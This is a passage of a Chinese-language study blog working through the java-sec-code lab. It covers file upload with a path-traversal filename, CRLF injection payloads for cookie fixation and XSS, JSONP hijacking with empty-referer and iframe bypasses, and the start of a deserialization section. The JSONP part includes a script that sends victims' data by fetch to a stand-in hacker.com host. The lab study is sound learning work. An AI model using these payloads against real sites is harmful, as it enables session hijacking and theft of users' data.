class="line"></span><br><span class="line">        <span class="comment">// 判断MIME类型是否在黑名单内 校验2</span></span><br><span class="line">        String[] mimeTypeBlackList = &#123;</span><br><span class="line">                <span class="string">&quot;text/html&quot;</span>,</span><br><span class="line">                <span class="string">&quot;text/javascript&quot;</span>,</span><br><span class="line">                <span class="string">&quot;application/javascript&quot;</span>,</span><br><span class="line">                <span class="string">&quot;application/ecmascript&quot;</span>,</span><br><span class="line">                <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;application/xml&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (String blackMimeType : mimeTypeBlackList) &#123;</span><br><span class="line">            <span class="comment">// 用contains是为了防止text/html;charset=UTF-8绕过</span></span><br><span class="line">            <span class="keyword">if</span> (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line"><span class="comment">//SecurityUtil.replaceSpecialStr这是一个自定义方法，应该是过滤掉特殊字符</span></span><br><span class="line">                logger.error(<span class="string">&quot;[-] Mime type error: &quot;</span> + mimeType);</span><br><span class="line">                deleteFile(filePath);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Upload failed. Illeagl picture.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断文件内容是否是图片 校验3</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isImageFlag</span> <span class="operator">=</span> isImage(excelFile);</span><br><span class="line"><span class="comment">//没见过这个函数，也不知道怎么回事</span></span><br><span class="line">        deleteFile(randomFilePath);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!isImageFlag) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;[-] File is not Image&quot;</span>);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Upload failed. Illeagl picture.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Get the file and save it somewhere</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = multifile.getBytes();</span><br><span class="line">            <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//经过过滤后写入文件</span></span><br><span class="line">        logger.info(<span class="string">&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;</span>, Suffix, mimeType);</span><br><span class="line">        logger.info(<span class="string">&quot;[+] Successfully uploaded &#123;&#125;&quot;</span>, filePath);</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;You successfully uploaded &#x27;%s&#x27;&quot;</span>, filePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//convert方法 返回File对象</span></span><br><span class="line"><span class="keyword">private</span> File <span class="title function_">convert</span><span class="params">(MultipartFile multiFile)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> multiFile.getOriginalFilename();</span><br><span class="line">        <span class="type">String</span> <span class="variable">suffix</span> <span class="operator">=</span> fileName.substring(fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"><span class="comment">//将文件后缀提取出来</span></span><br><span class="line">        <span class="type">UUID</span> <span class="variable">uuid</span> <span class="operator">=</span> Generators.timeBasedGenerator().generate();</span><br><span class="line"><span class="comment">//基于时间生成的UUID作为文件名</span></span><br><span class="line">        randomFilePath = UPLOADED_FOLDER + uuid + suffix;</span><br><span class="line">        <span class="comment">// 随机生成一个同后缀名的文件</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">convFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(randomFilePath);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ret</span> <span class="operator">=</span> convFile.createNewFile();</span><br><span class="line"><span class="comment">//调用File类的creatNewFile();创建当前类指向的空文件</span></span><br><span class="line">        <span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(convFile);</span><br><span class="line"><span class="comment">//为这个文件创建写入流</span></span><br><span class="line">        fos.write(multiFile.getBytes());</span><br><span class="line"><span class="comment">//将文件数据写入文件</span></span><br><span class="line">        fos.close();</span><br><span class="line">        <span class="keyword">return</span> convFile;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>/upload/picture</code>这个路由就明显有点东西了，过滤掉了不少东西。由于模板渲染，我们直接访问<code>uploadPic</code>即可进行文件上传</p>
<p>我们可以看到比未过滤的路由不同的是，这次对multiFile，不是直接写入，而是通过一个convert的方法去生成临时文件，然后遇到被过滤的情况就会通过delet方法删除临时文件</p>
<p>然后我有一个就看不懂了，就是为什么convert生成的临时文件为UUID拼接而成，但是delete删除的却是filtpath这个原文件名的文件路径，不知道这是为什么，试一下就知道了</p>


<p>可以看到，即使被过滤了，我们还是可以直接上传到&#x2F;tmp目录下，看来好像真的代码写错了，这就是著名的逻辑漏洞吗</p>
<p>这个代码就属于修复代码，我现在也是无法上传webshell了</p>
<p>文件上传已经结束了，之前那个属于逻辑漏洞，我们可以上传webshell但是无法访问，但是还有目录跨越漏洞，我们可以注意到下面代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Get the file and save it somewhere</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = multifile.getBytes();</span><br><span class="line">            <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//这个直接拼接了文件名存在目录跨越漏洞</span></span><br></pre></td></tr></table></figure>

<p>这个目录跨越漏洞可以使我们将文件上传至静态目录访问到，但是只能上传图片</p>
<p>我们将文件名改为</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..\src\main\resources\<span class="keyword">static</span>\<span class="number">1.</span>png</span><br><span class="line"><span class="comment">//Windows路径</span></span><br></pre></td></tr></table></figure>

<p>由于使用了**<code>ImageIO.read(file)</code>**，我只能使用一张真正的图片了</p>


<p>成功上传，可以直接在静态目录访问，但是加载项目结构需要我重启靶场</p>


<p>成功通过静态目录访问上传图片</p>
<h2 id="6-CRLFInjection"><a href="#6-CRLFInjection" class="headerlink" title="6.CRLFInjection"></a>6.CRLFInjection</h2><p>CRLF是”回车+换行”(\r\n)(编码后是%0D%0A)的简称,在HTTP中,HTTP Header和HTTP Body是用两个CRLF来分割的。浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。CRLF漏洞可以造成Cookie会话固定和反射型XSS(可过waf)的危害，注入XSS的利用方式：连续使用两次%0d%oa就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。</p>
<p>我才知道回车和换行是两个东西，回车指的是回到行首，换行指的是移动到下一行</p>
<table>
<thead>
<tr>
<th align="left"><strong>系统</strong></th>
<th align="left"><strong>换行符</strong></th>
<th align="left"><strong>示例</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>Unix&#x2F;Linux</strong></td>
<td align="left"><code>\n</code> (LF)</td>
<td align="left"><code>Hello\nWorld</code></td>
</tr>
<tr>
<td align="left"><strong>Windows</strong></td>
<td align="left"><code>\r\n</code> (CR+LF)</td>
<td align="left"><code>Hello\r\nWorld</code></td>
</tr>
<tr>
<td align="left"><strong>旧版 Mac</strong></td>
<td align="left"><code>\r</code> (CR)</td>
<td align="left"><code>Hello\rWorld</code></td>
</tr>
</tbody></table>
<p>假如我们可以操控http头中的部分，那么我们就可能实现CRLF注入，我们以最常见的重定向为例:<br>假如我们可以在url后面输入参数作为302重定向的对象,假如对于一个正常的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//test.com/?url=http://www.baidu.com </span></span><br></pre></td></tr></table></figure>

<p>响应头为</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Moved Temporarily </span><br><span class="line">Date: Wed, <span class="number">29</span> Jan <span class="number">2020</span> <span class="number">20</span>:<span class="number">40</span>:<span class="number">17</span> GMT </span><br><span class="line">Content-Type: text/html </span><br><span class="line">Connection: close </span><br><span class="line">Location: http:<span class="comment">//www.baidu.com</span></span><br></pre></td></tr></table></figure>

<p>但是，如果我们构造这样的url:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//test.com/?url=http://www.baidu.com%0aSet_cookie:sessionid=V0n </span></span><br></pre></td></tr></table></figure>

<p>此时响应头就会变成:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Moved Temporarily </span><br><span class="line">Date: Wed, <span class="number">29</span> Jan <span class="number">2020</span> <span class="number">20</span>:<span class="number">43</span>:<span class="number">33</span> GMT </span><br><span class="line">Content-Type: text/html </span><br><span class="line">Connection: close </span><br><span class="line">Location: http:<span class="comment">//www.baidu.com </span></span><br><span class="line">cookie: sessionid=V0n </span><br></pre></td></tr></table></figure>

<p>可以看到，此时cookie已经被我们设定成为了一个特定值，也就是形成了一个会话维持漏洞。</p>
<p>但是这个会话维持漏洞只是会在响应头中<code>Set_Cookie</code>让我们浏览器储存Cookie然后持久性发送。感觉和我每次自己伪造Cookie没什么区别只是方便一点</p>
<p>在什么的例子中,我们以%0a分割Set_cookie和重定向网站，只是为了实现设置Http Header，而如果我们设置url为:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//test.com/?url=http://www.baidu.com%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么我们的响应头将会变成:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Moved Temporarily </span><br><span class="line">Date: Wed, <span class="number">29</span> Jan <span class="number">2020</span> <span class="number">20</span>:<span class="number">49</span>:<span class="number">33</span> GMT</span><br><span class="line">Content-Type: text/html </span><br><span class="line">Content-Length: <span class="number">154</span> </span><br><span class="line">Connection: close </span><br><span class="line">Location:</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>

<p>实现了一个XSS漏洞，但是反射型的XSS还是没有什么用啊</p>
<p>我们来看靶场的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/crlf&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CRLFInjection</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/safecode&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">crlf</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        response.addHeader(<span class="string">&quot;test1&quot;</span>, request.getParameter(<span class="string">&quot;test1&quot;</span>));</span><br><span class="line"><span class="comment">//addHeader设置响应头  可以在响应头中设置多个同名字段不会进行覆盖</span></span><br><span class="line">        response.setHeader(<span class="string">&quot;test2&quot;</span>, request.getParameter(<span class="string">&quot;test2&quot;</span>));</span><br><span class="line"><span class="comment">//setHeader设置响应头，会对原有字段进行覆盖，只保留新字段</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">author</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;test3&quot;</span>);</span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;test3&quot;</span>, author);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line"><span class="comment">//响应头添加cookie</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到这个代码会将我们的参数test放到响应头中，还会将test3放入<code>Set_Cookie</code>中</p>
<p>但这个问题实际上已经在所有的现在的java EE应用服务器上修复了。如果你想关注这个漏洞，你应该在目标平台测试是否允许将CRLF插入到HTTP头中。不出意外的话，这个漏洞已经在大部分的目前的应用服务器上修复了，无论是用什么语言编写的。</p>
<p>我们也是尝试一下</p>


<p>注意到并没有换行，也是一个快消失的漏洞啊</p>
<h2 id="7-Jsonp"><a href="#7-Jsonp" class="headerlink" title="7.Jsonp"></a>7.Jsonp</h2><p>Jsonp(JSON with Padding) 是 json 的一种”使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p>
<p>我们之前在写Cors的时候知道当我们想要从一个网站向非同源网站请求数据的时候就需要使用Cors绕过同源策略，才能获取请求数据。</p>
<p>Jsonp则可以直接不管同源策略进行数据获取，利用的就是<code>&lt;script&gt;</code>标签不受同源策略限制，通过动态插入 <code>&lt;script&gt;</code> 的方式间接获取跨域数据。</p>
<p><strong>JSONP（JSON with Padding）</strong> 的核心机制就是：</p>
<ol>
<li><strong>客户端</strong> 提前定义一个回调函数（如 <code>handleData</code>）。</li>
<li><strong>客户端</strong> 通过 <code>&lt;script&gt;</code> 标签请求服务器，并在 URL 中指定回调函数名（如 <code>?callback=handleData</code>）。</li>
<li><strong>服务器</strong> 返回的数据不是纯 JSON，而是一段 <strong>JS 代码</strong>，格式为：</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handleData(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">25</span>&#125;);  <span class="comment">// 用客户端指定的函数名包裹 JSON 数据</span></span><br></pre></td></tr></table></figure>

<p>浏览器加载这段 JS 代码后，会自动执行 <code>handleData</code> 函数，客户端就能在函数内部处理数据了。</p>
<p>我们需要注意的是Jsonp只能在GET请求下使用，所以我们客户端需要在URL中指定回调函数名</p>
<p>也就是说我们返回的数据实际上是服务器端返回的json数据经过我们GET传递函数名称的执行结果</p>
<p>我们可以利用这个JSONP漏洞伪造钓鱼网站，当你点击钓鱼网站时，触发JSONP向目标网站请求数据，由于你的浏览器自带Cookie，然后再触发js代码，将你的信息发送到黑客的服务器实现CSRF攻击完成信息泄露</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://social.com/userinfo?callback=sendToHacker&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function <span class="title function_">sendToHacker</span><span class="params">(data)</span> &#123;</span><br><span class="line">    fetch(<span class="string">&quot;https://hacker.com/log?data=&quot;</span> + JSON.stringify(data));</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>还有利用JSON参数和函数进行XSS攻击等。</p>
<p>我们先来看下没有经过任何过滤的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/vuln/referer&quot;, produces = &quot;application/javascript&quot;)</span></span><br><span class="line"><span class="comment">//produces这个参数用于MVC规定返回的content-type</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">referer</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">callback</span> <span class="operator">=</span> request.getParameter(<span class="built_in">this</span>.callback);</span><br><span class="line">        <span class="keyword">return</span> WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个就是直接获取了我们URL中的callback函数名，然后有</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));</span><br><span class="line"><span class="comment">//LoginUtils.getUserInfo2JsonStr(request)应该是获取json数据</span></span><br></pre></td></tr></table></figure>

<p>这个代码进行一个js代码的返回，由于这个不是java自带的函数我只能猜测其用法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//假设 WebUtils.json2Jsonp() 的实现如下：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">json2Jsonp</span><span class="params">(String callback, String jsonStr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> callback + <span class="string">&quot;(&quot;</span> + jsonStr + <span class="string">&quot;);&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们就通过在前端界面自己写一个函数然后通过返回的js代码携带json数据进行各种操作</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">aaa</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">alert</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://127.0.0.1:8080/jsonp/vuln/referer?callback_</span>=<span class="string">aaa</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我直接触发一个弹窗返回JSON数据，在实际中这里可以改为XSS或者CSRF</p>




<p><strong>1.空referer绕过</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/vuln/emptyReferer&quot;, produces = &quot;application/javascript&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">emptyReferer</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">referer</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;referer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> != referer &amp;&amp; SecurityUtil.checkURL(referer) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">callback</span> <span class="operator">=</span> request.getParameter(<span class="built_in">this</span>.callback);</span><br><span class="line">        <span class="keyword">return</span> WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个代码在返回JSON数据的时候会对我们的referer进行检验，我们不知道这个校验规则，但是只要referer为空就能绕过报错</p>
<p>我们需要注意的就是我们如果自己抓包手动删除请求头中的Referer或者发包就没有Referer这个字段的话，服务器端是直接检测不到referer这个字段的，所以也不会出现referer为null的情况，所以我们需要在html中设置</p>
<p>添加no-referrer 参数</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-referrer&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">aaa</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">alert</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://127.0.0.1:8080/jsonp/vuln/emptyReferer?callback_</span>=<span class="string">aaa</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有个奇怪的地方就是我们设置的标签中名字为<code>referrer</code>，怎么和请求头中的不一样，查了一下才发现html中的才是正确写法，http中的是设计师当初写错的写法</p>
<p>我们还可以通过iframe标签进行绕过</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-referrer&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:&#x27;&lt;script&gt;function test(data)&#123;alert(JSON.stringify(data));&#125;&lt;/script&gt;&lt;script src=http://172.20.10.6:8080/java_sec_code_war/jsonp/vuln/emptyReferer?callback_=test&gt;&lt;/script&gt;&#x27;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>修复代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/sec/checkReferer&quot;, produces = &quot;application/javascript&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">safecode</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">referer</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;referer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (SecurityUtil.checkURL(referer) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">callback</span> <span class="operator">=</span> request.getParameter(<span class="built_in">this</span>.callback);</span><br><span class="line">        <span class="keyword">return</span> WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个就是修复代码吗，不过是不给设置referer为null的机会而已</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value = &quot;/fastjsonp/getToken&quot;, produces = &quot;application/javascript&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCsrfToken2</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="type">CsrfToken</span> <span class="variable">csrfToken</span> <span class="operator">=</span> cookieCsrfTokenRepository.loadToken(request); <span class="comment">// get csrf token</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">callback</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;fastjsonpCallback&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotBlank(callback)) &#123;</span><br><span class="line">            <span class="comment">//如果callback函数存在即返回json数据</span></span><br><span class="line">            <span class="type">JSONPObject</span> <span class="variable">jsonpObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONPObject</span>(callback);</span><br><span class="line">            jsonpObj.addParameter(csrfToken);</span><br><span class="line">            <span class="keyword">return</span> jsonpObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//否则直接返回原数据</span></span><br><span class="line">            <span class="keyword">return</span> csrfToken.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>JSONPObject</code> 是 <strong>Jackson 库</strong>（或类似 JSON 库）提供的类，专门用于生成 JSONP 格式的数据。它的核心功能是：</p>
<ul>
<li><strong>接收一个回调函数名</strong>（如 <code>callbackFunc</code>）。</li>
<li><strong>允许添加参数</strong>（如 <code>csrfToken</code>），这些参数会被序列化成 JSON 格式。</li>
<li><strong>最终生成 <code>callbackFunc(jsonData)</code> 这样的字符串</strong>，可直接被浏览器执行。****</li>
</ul>
<p>这个代码和原来一样没有任何过滤，只不过检查了callback这个函数是否存在</p>




<h2 id="8-Deserialize-序列化与反序列化"><a href="#8-Deserialize-序列化与反序列化" class="headerlink" title="8.Deserialize 序列化与反序列化"></a>8.Deserialize 序列化与反序列化</h2><p>我们之前学习过JAVA反序列化，需要先对数据创建输入流，然后使用输入流创建<strong>对象输入流</strong>然后使用readObject方法对数据进行反序列化对对象进行属性上的赋值</p>
